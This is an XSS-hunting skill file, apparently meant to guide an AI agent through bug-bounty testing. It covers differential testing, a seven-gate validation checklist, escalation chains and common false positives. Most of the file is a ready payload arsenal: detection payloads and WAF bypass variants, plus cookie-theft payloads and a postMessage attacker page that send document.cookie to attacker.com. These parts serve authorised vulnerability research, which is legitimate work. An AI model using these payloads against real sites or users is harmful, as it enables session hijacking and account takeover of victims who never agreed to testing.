---
name: hunt-xss
description: XSS hunting with differential testing — Reflected, Stored, DOM-based, postMessage. WAF bypass techniques. Every candidate must demonstrate script execution in victim's context. 7-gate validation mandatory.
---

# XSS HUNTING — DIFFERENTIAL TESTING METHOD

**XSS is only a vulnerability if it executes in a victim's browser with their session.**

---

## HYPOTHESIS GENERATION

```
HYPOTHESIS: [XSS type] on [endpoint]
  Endpoint: [METHOD] [URL with parameter]
  Parameter: [param_name]
  Precondition: [victim visits URL / victim views stored content]
  Expected: Input is sanitized/encoded
  Attack: Malicious script executes in victim's context
  Impact: Session hijack / ATO / data theft
  Confidence: [HIGH/MEDIUM/LOW]
```

---

## DIFFERENTIAL TESTING METHOD

### Core Principle

> **The vulnerability is not that the payload appears in the response. The vulnerability is that it appears UNENCODED and EXECUTABLE in a victim's browser context.**

### Reflected XSS Differential

```
TEST MATRIX:
  Normal input (hello) → reflected safely (HTML-encoded)
  XSS payload (<script>alert(1)</script>) → reflected UNSAFELY (unencoded)
  Payload in HTML context → executes
  Payload in attribute context → different encoding needed
  Payload in JavaScript context → different encoding needed

FINDING: If malicious input is reflected unencoded → Reflected XSS
NOT A FINDING: If payload is HTML-encoded → correctly sanitized
```

### Implementation

```bash
# Step 1: Baseline — normal input
curl -s "https://target.com/search?q=hello" | grep "hello"
# EXPECTED: hello appears HTML-encoded: &lt;script&gt; or similar

# Step 2: Differential — XSS payload
curl -s "https://target.com/search?q=<script>alert(1)</script>" | grep "<script>alert"
# EXPECTED: Payload HTML-encoded
# IF APPEARS UNENCODED → XSS CONFIRMED

# Step 3: Verify execution context
# Check: Is the payload in an HTML context? Attribute? JavaScript?
# This determines which payload variant works
```

### Stored XSS Differential

```
TEST SEQUENCE:
  1. Submit payload via POST/PUT (stored)
  2. Retrieve page where payload is displayed
  3. Check if payload is encoded or raw

  Submit: POST /api/comments {"text": "<script>alert(1)</script>"}
  Retrieve: GET /api/comments → check if <script> appears raw
  Execute: GET /comments/page → check if script executes
```

---

## PAYLOAD ARSENAL

### Detection Payloads

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
' ><script>alert(1)</script>
javascript:alert(1)
```

### Cookie Theft (Impact Proof)

```html
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
<script>new Image().src='https://attacker.com?c='+document.cookie</script>
```

### WAF Bypass

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

<!-- Comments -->
<scr/**/ipt>alert(1)</scr/**/ipt>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- SVG -->
<svg/onload=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- Details -->
<details open ontoggle=alert(1)>

<!-- Input -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>

<!-- Polyglot -->
'">><marquee><img src=x onerror=confirm(1)></marquee>
```

### DOM XSS Sources → Sinks

**Sources** (user-controlled):
```javascript
location.hash, location.search, location.href, document.referrer, window.name, document.URL
```

**Sinks** (dangerous):
```javascript
innerHTML, outerHTML, document.write, eval, setTimeout(string), setInterval(string),
new Function, element.src, element.href, location.href
```

### postMessage XSS

```javascript
// Find listeners
getEventListeners(window).message

// Attacker page
<iframe src="https://victim.com" id="v"></iframe>
<script>
document.getElementById('v').onload = () => {
  document.getElementById('v').contentWindow.postMessage(
    '<img src=x onerror="fetch(\'//attacker.com/?c=\'+document.cookie)">', '*')
}
</script>
```

---

## WAF BYPASS DECISION TREE

```
Is <script> blocked?
├── YES → Try <img onerror>, <svg onload>, <details ontoggle>
├── YES and all HTML tags blocked → Try javascript: URI, event handlers
├── YES and all event handlers blocked → Try CSS injection, <base> tag
└── NO → Use basic payload, focus on cookie theft

Is alert(1) blocked?
├── YES → Try confirm(1), prompt(1), console.log(1)
├── YES and all JS functions blocked → Try String.fromCharCode, atob
└── NO → Use basic payload
```

---

## GATE VALIDATION CHECKLIST

### Gate 1 — Scope
- [ ] Affected endpoint is in scope

### Gate 2 — Security Boundary
- [ ] Victim's browser context is compromised
- [ ] Session/cookie/data accessible to attacker

### Gate 3 — Attacker Capability
- [ ] Victim must visit attacker-controlled URL or view attacker-controlled content

### Gate 4 — Reproducibility
- [ ] Exact URL with payload provided
- [ ] Screenshot/video of execution

### Gate 5 — Impact
- [ ] Select impact:
  - Reflected XSS + cookie theft → Session hijack → High
  - Stored XSS + admin panel → Privilege escalation → Critical
  - DOM XSS + OAuth flow → Token theft → Critical
  - Self-XSS + CSRF → Trigger on victim → High

### Gate 6 — False Positive Elimination
- [ ] Payload actually EXECUTES (not just reflected)
- [ ] Not self-XSS (only triggers for the attacker)
- [ ] HttpOnly flag check — can you actually steal cookies?
- [ CSP check — does CSP block execution?

### Gate 7 — Program Acceptance
- [ ] XSS is in scope
- [ ] Impact meets severity threshold

---

## ESCALATION CHAINS

```
Reflected XSS + cookie theft → Session hijack → ATO → Critical
Stored XSS + admin panel → Privilege escalation → Critical
DOM XSS + OAuth flow → Token theft → ATO → Critical
Self-XSS + CSRF → Trigger on victim → ATO → High
XSS + CSP bypass → Bypass all defenses → High
XSS + WebSocket → Real-time data exfil → High
```

---

## COMMON FALSE POSITIVES

```
FALSE POSITIVE: "Payload appears in response"
REALITY: Payload must be UNENCODED and in EXECUTABLE context
  → Check: Is it HTML-encoded? (&lt; instead of <)
  → Check: Is it in a JavaScript string? (needs different escape)
  → Check: Is it in an HTML attribute? (needs attribute context)

FALSE POSITIVE: "Self-XSS works"
REALITY: Self-XSS only affects the attacker
  → Must demonstrate triggering on ANOTHER user
  → Chain with CSRF or social engineering

FALSE POSITIVE: "alert(1) executes"
REALITY: Need to demonstrate IMPACT
  → Show cookie theft or session hijack
  → alert(1) alone = proof of concept, not impact
```
